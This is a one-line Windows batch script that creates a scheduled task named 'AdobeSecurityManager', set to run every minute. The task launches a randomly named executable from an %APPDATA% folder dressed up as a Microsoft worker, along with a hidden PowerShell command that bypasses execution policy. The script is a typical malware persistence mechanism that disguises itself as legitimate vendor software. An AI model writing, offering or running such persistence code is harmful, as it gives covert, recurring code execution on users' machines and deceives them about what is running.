@echo off
schtasks.exe /create /sc minute /mo 1 /tn "AdobeSecurityManager" /tr "%APPDATA%\MicrosoftWorker_e08ec640d\rhpmx63snl.exe --headless powershell.exe -w h -ep bypass -c Write-Host ready"
